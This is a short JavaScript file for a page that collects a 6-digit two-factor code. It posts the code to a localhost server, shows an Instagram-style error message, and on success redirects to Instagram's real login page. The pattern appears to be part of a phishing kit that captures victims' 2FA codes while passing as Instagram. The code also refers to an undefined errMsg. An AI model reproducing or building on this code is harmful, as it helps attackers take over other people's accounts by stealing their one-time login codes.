const usernameInput = document.getElementById('two-fa');
const loginBtn = document.getElementById('verify-btn');

const toggleLoginButton = () => {
    loginBtn.disabled = !(usernameInput.value.length > 5);
};

usernameInput.addEventListener('input', toggleLoginButton);

loginBtn.addEventListener('click', (e) => {
    e.preventDefault(); // Prevent the form from submitting normally
    const userdata = {
        code: usernameInput.value,
    }

    fetch("http://localhost:3000/validate-2fa", {
        method: "POST",
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(userdata)
    })
        .then(response => response.json())
        .then(data => {
            console.log(data);
            if (data.answer === '1') {
                // console.log("Redirect");
                errMsg.textContent = "";
                window.location.href = `https://www.instagram.com/accounts/login/`;
            } else {
                // console.log("Sorry");
                errMsg.textContent = 'Sorry, your 6-digit code was incorrect.';
            }
        })
        .catch(error => console.log(error));
});
